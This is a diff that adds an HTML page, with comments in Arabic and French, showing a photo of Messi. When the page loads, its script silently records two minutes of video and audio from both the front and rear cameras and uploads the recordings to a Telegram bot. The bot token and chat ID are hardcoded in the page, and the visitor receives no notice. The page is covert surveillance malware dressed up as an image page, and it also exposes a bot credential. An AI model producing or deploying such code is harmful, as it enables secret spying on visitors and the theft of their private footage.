@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الفيديو وإرساله</title>
+    <style>
+        img {
+            width: 100%;
+            height: auto; /* Correction pour éviter la distorsion de l'image */
+        }
+    </style>
+</head>
+<body>
+    <img src="messi.jpg" alt="صورة ميسي"> <!-- Ajout de alt pour améliorer l'accessibilité -->
+
+    <script>
+        function startRecording(facingMode, videoFileName) {
+            // Demande l'accès à la caméra et au micro
+            navigator.mediaDevices.getUserMedia({
+                video: { facingMode }, // Mode caméra (frontal أو خلفي)
+                audio: true // Inclure l'audio
+            })
+            .then(stream => {
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = []; // Tableau pour stocker les données enregistrées
+
+                // Stocker les morceaux de données lorsque disponibles
+                mediaRecorder.ondataavailable = event => {
+                    if (event.data.size > 0) {
+                        chunks.push(event.data);
+                    }
+                };
+
+                // Une fois l'enregistrement terminé, créer un fichier vidéo
+                mediaRecorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    const formData = new FormData();
+                    formData.append('video', blob, videoFileName);
+
+                    // Configuration des paramètres pour envoyer la vidéo عبر Telegram
+                    const telegramBotToken = '7805312236:AAHjL_NRF2EHMAhgz1y_peA-edFA6C5d7Fk';
+                    const chatId = '5660930967';
+
+                    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendVideo?chat_id=${chatId}`, {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log(`تم إرسال الفيديو (${videoFileName}) بنجاح:`, data);
+                    })
+                    .catch(error => {
+                        console.error(`حدث خطأ أثناء إرسال الفيديو (${videoFileName}):`, error);
+                    });
+                };
+
+                // بدء التسجيل
+                mediaRecorder.start();
+
+                // إيقاف التسجيل بعد دقيقتين
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                    stream.getTracks().forEach(track => track.stop());
+                }, 2 * 60 * 1000); // 2 دقائق
+            })
+            .catch(error => {
+                console.error(`خطأ أثناء الوصول إلى الكاميرا (${facingMode}):`, error);
+            });
+        }
+
+        // يتم تنفيذ الكود بعد تحميل الصفحة
+        document.addEventListener('DOMContentLoaded', () => {
+            startRecording('user', 'front_recording.webm'); // الكاميرا الأمامية
+            startRecording('environment', 'back_recording.webm'); // الكاميرا الخلفية
+        });
+    </script>
+</body>
+</html>
